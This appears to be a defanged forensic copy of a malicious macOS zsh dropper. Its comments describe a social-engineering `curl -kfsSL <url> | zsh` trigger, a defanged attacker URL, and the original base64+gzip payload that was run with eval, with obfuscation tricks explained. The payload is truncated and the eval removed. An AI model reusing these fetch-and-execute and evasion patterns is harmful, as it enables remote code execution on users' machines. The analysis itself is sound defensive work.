#!/bin/zsh
# ============================================================================
# NEUTRALIZED — Stage 1: Obfuscated Dropper
# ============================================================================
#
# ATTACK VECTOR: Base64 + Gzip obfuscated shell script
# ORIGINAL SOURCE: http://fusser-api[.]com/curl/<token>
# TRIGGER: User executes `curl -kfsSL <url> | zsh` (social engineering)
#
# WHAT IT DID:
#   1. Decoded a base64+gzip payload into variable $d9804
#   2. Executed the decoded payload via eval "$d9804"
#   3. The decoded payload was Stage 2 (see stage2_daemon.sh)
#
# OBFUSCATION TECHNIQUES:
#   - Variable name "d9804" is random/meaningless to evade grep
#   - base64 + gzip double-encoding hides the true payload
#   - heredoc with random delimiter "PAYLOAD_m21538190221297" avoids pattern matching
#   - curl flags: -k (ignore TLS), -f (fail silently), -sS (silent), -L (follow redirects)
#
# WHY IT'S DANGEROUS:
#   - `curl | zsh` pattern executes arbitrary remote code with no inspection
#   - The -k flag disables TLS certificate verification (MITM-friendly)
#   - The obfuscated payload is invisible to casual inspection
#   - eval executes whatever the attacker puts in the payload
#
# ============================================================================

# NEUTRALIZED: Original base64+gzip payload removed.
# The decoded contents are preserved in stage2_daemon.sh for analysis.
#
# Original code was:
#   d9804=$(base64 -D <<'PAYLOAD_m21538190221297' | gunzip
#   H4sIACE8nGkAA91WW2/bNhR+968... [1312 bytes of base64]
#   PAYLOAD_m21538190221297
#   )
#   eval "$d9804"    # <-- THIS IS THE KILL SHOT: blind eval of decoded payload
#
# The eval has been removed. The base64 payload decodes to stage2_daemon.sh.

echo "NEUTRALIZED: This script has been defanged for forensic analysis."
echo "See stage2_daemon.sh for the decoded payload contents."
exit 0
